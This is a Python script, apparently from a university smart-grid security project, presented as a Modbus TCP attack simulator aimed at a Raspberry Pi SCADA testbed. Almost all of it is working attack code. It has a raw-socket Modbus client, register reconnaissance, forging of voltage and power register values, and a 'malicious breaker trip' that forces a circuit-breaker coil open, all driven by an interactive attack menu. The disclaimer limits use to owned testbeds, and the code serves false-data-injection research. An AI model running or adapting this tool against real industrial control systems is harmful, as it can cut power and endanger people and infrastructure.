#!/usr/bin/env python3
"""
RESEARCH DISCLAIMER:
-------------------
This script is for academic research and educational purposes only, specifically for
the SmartGrid FDIA Shield final-year university project. It demonstrates vulnerabilities
in unauthenticated industrial SCADA / Modbus TCP networks.
Use ONLY on networks and testbeds you own and control.

MODULE BRIEFING:
---------------
Industrial Modbus TCP Attack & SCADA Reconnaissance Simulator.
Target: Raspberry Pi Modbus TCP Server (port 5020 or 502).

Capabilities:
1. SCADA Reconnaissance: Reads holding registers (V, I, P, Synchrophasor angle, WLS residuals)
2. Register Injection: Forges register values directly in the SCADA database
3. Malicious Breaker Trip: Forces Circuit Breaker Coil 00001 to 0 (tripping the grid feeder)
4. Breaker Re-Close: Restores the circuit breaker to 1
"""

import argparse
import socket
import struct
import sys
import time

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║        SmartGrid Industrial Modbus TCP Attack Simulator      ║
║        Targeting Substation Gateway & SCADA Registers        ║
║        RESEARCH USE ONLY — Controlled Testbed                ║
╚══════════════════════════════════════════════════════════════╝
"""

class ModbusClient:
    """Lightweight pure-socket Modbus TCP client."""
    def __init__(self, host="10.59.53.30", port=5020, timeout=3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.trans_id = 1
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def read_holding_registers(self, start_addr=0, count=12):
        """FC03: Read Holding Registers."""
        self.trans_id += 1
        mbap = struct.pack('>HHHB', self.trans_id, 0, 6, 1)
        pdu = struct.pack('>BHH', 3, start_addr, count)
        self.sock.sendall(mbap + pdu)

        resp_mbap = self.sock.recv(7)
        if len(resp_mbap) < 7:
            return None
        _, _, length, _ = struct.unpack('>HHHB', resp_mbap)
        resp_pdu = self.sock.recv(length - 1)
        if len(resp_pdu) < 2 or resp_pdu[0] != 3:
            return None
        byte_count = resp_pdu[1]
        raw_vals = resp_pdu[2:2 + byte_count]
        fmt = f'>{len(raw_vals)//2}H'
        return list(struct.unpack(fmt, raw_vals))

    def write_single_coil(self, coil_addr=0, state=True):
        """FC05: Write Single Coil."""
        self.trans_id += 1
        val_bytes = 0xFF00 if state else 0x0000
        mbap = struct.pack('>HHHB', self.trans_id, 0, 6, 1)
        pdu = struct.pack('>BHH', 5, coil_addr, val_bytes)
        self.sock.sendall(mbap + pdu)

        resp = self.sock.recv(12)
        return len(resp) >= 8

    def write_single_register(self, reg_addr=0, value=2500):
        """FC06: Write Single Holding Register."""
        self.trans_id += 1
        mbap = struct.pack('>HHHB', self.trans_id, 0, 6, 1)
        pdu = struct.pack('>BHH', 6, reg_addr, value & 0xFFFF)
        self.sock.sendall(mbap + pdu)

        resp = self.sock.recv(12)
        return len(resp) >= 8


def run_reconnaissance(client):
    print("\n[*] Sending Modbus FC03: Read Holding Registers 40001 - 40012...")
    regs = client.read_holding_registers(start_addr=0, count=12)
    if not regs:
        print("[-] Failed to read registers or connection timed out.")
        return

    v = regs[0] / 10.0
    i = regs[1] / 1000.0
    p = regs[2]
    f = regs[3] / 100.0
    pf = regs[4] / 1000.0
    # Signed 16-bit angle
    angle_raw = regs[5]
    if angle_raw > 32767: angle_raw -= 65536
    angle_deg = angle_raw / 100.0

    rocof_raw = regs[6]
    if rocof_raw > 32767: rocof_raw -= 65536
    rocof = rocof_raw / 1000.0

    wls_chi2 = regs[7] / 10.0
    wls_rn = regs[8] / 100.0
    wls_bad = "BAD DATA" if regs[9] == 1 else "CLEAN"
    status_str = ["NORMAL", "SUSPICIOUS", "ATTACK_CONFIRMED"][min(regs[10], 2)]
    confidence = regs[11] / 100.0

    print("╔═══════════════════════════════════════════════════════════╗")
    print("║             SUBSTATION SCADA REGISTER DUMP                ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print(f"║ 40001 Voltage:           {v:>8.1f} V                          ║")
    print(f"║ 40002 Current:           {i:>8.3f} A                          ║")
    print(f"║ 40003 Active Power:      {p:>8} W                          ║")
    print(f"║ 40004 Frequency:         {f:>8.2f} Hz                         ║")
    print(f"║ 40005 Power Factor:      {pf:>8.3f}                            ║")
    print(f"║ 40006 Synchrophasor δ:   {angle_deg:>+8.2f} deg                       ║")
    print(f"║ 40007 ROCOF (df/dt):     {rocof:>+8.3f} Hz/s                      ║")
    print(f"║ 40008 WLS Chi-Square J:  {wls_chi2:>8.1f}                            ║")
    print(f"║ 40009 WLS Max Residual:  {wls_rn:>8.2f}                            ║")
    print(f"║ 40010 WLS State Check:   {wls_bad:>10}                        ║")
    print(f"║ 40011 Fusion Status:     {status_str:>16}                 ║")
    print(f"║ 40012 Attack Confidence: {confidence:>8.1f} %                          ║")
    print("╚═══════════════════════════════════════════════════════════╝")


def run_trip_attack(client):
    print("\n[!] INITIATING MALICIOUS CIRCUIT BREAKER TRIP (Coil 00001 -> 0)...")
    success = client.write_single_coil(coil_addr=0, state=False)
    if success:
        print("\033[91m[+] SUCCESS: SCADA Coil 00001 forced OPEN. Grid Feeder Tripped!\033[0m")
    else:
        print("[-] Trip command failed.")


def run_close_breaker(client):
    print("\n[*] Sending Breaker Close Command (Coil 00001 -> 1)...")
    success = client.write_single_coil(coil_addr=0, state=True)
    if success:
        print("\033[92m[+] SUCCESS: SCADA Coil 00001 set to CLOSED. Feeder Energized.\033[0m")
    else:
        print("[-] Close command failed.")


def run_register_injection(client):
    print("\n--- Modbus Register Tampering Configuration ---")
    try:
        reg_num = int(input("  Register to overwrite [40001=Voltage, 40003=Power]: ").strip() or "40001")
        if reg_num == 40001:
            val_input = float(input("  Forged Voltage value in Volts [280.0]: ").strip() or "280.0")
            raw_val = int(val_input * 10)
            reg_addr = 0
        elif reg_num == 40003:
            raw_val = int(input("  Forged Power value in Watts [5000]: ").strip() or "5000")
            reg_addr = 2
        else:
            reg_addr = reg_num - 40001
            raw_val = int(input("  Raw 16-bit unsigned value to write: ").strip())
    except (ValueError, EOFError):
        print("[-] Invalid input. Aborted.")
        return

    print(f"[!] Overwriting Register {40001 + reg_addr} with value {raw_val}...")
    success = client.write_single_register(reg_addr=reg_addr, value=raw_val)
    if success:
        print(f"\033[91m[+] SUCCESS: Register {40001 + reg_addr} tampered over unauthenticated Modbus TCP!\033[0m")
    else:
        print("[-] Write failed.")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Modbus TCP SCADA Attack Simulator")
    parser.add_argument('--target', default='10.59.53.30', help="Target Raspberry Pi IP")
    parser.add_argument('--port', type=int, default=5020, help="Modbus TCP Port (default: 5020)")
    parser.add_argument('--action', choices=['recon', 'trip', 'close', 'inject', 'menu'], default='menu', help="Action to execute")
    args = parser.parse_args()

    client = ModbusClient(host=args.target, port=args.port)
    try:
        client.connect()
        print(f"[+] Connected to Substation Modbus TCP Gateway at {args.target}:{args.port}")
    except Exception as e:
        print(f"[-] Connection failed to {args.target}:{args.port}: {e}")
        sys.exit(1)

    try:
        if args.action == 'recon':
            run_reconnaissance(client)
        elif args.action == 'trip':
            run_trip_attack(client)
        elif args.action == 'close':
            run_close_breaker(client)
        elif args.action == 'inject':
            run_register_injection(client)
        else:
            while True:
                print(f"""
╔══════════════════════════════════════════════════════════════╗
║               MODBUS TCP INDUSTRIAL ATTACK MENU              ║
╠══════════════════════════════════════════════════════════════╣
║  1. SCADA Reconnaissance (Read All Registers & PMU Angle)    ║
║  2. Malicious Breaker Trip Attack (Force Coil 00001 -> Open) ║
║  3. Re-Close Circuit Breaker (Restore Feeder Power)          ║
║  4. Direct Register Tampering (Forge SCADA Sensor Value)     ║
║  5. Exit                                                     ║
╚══════════════════════════════════════════════════════════════╝
""")
                try:
                    choice = input("  Select option [1-5]: ").strip()
                except (EOFError, KeyboardInterrupt):
                    break

                if choice == '1':
                    run_reconnaissance(client)
                elif choice == '2':
                    run_trip_attack(client)
                elif choice == '3':
                    run_close_breaker(client)
                elif choice == '4':
                    run_register_injection(client)
                elif choice == '5':
                    break
                time.sleep(0.5)
    finally:
        client.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    main()
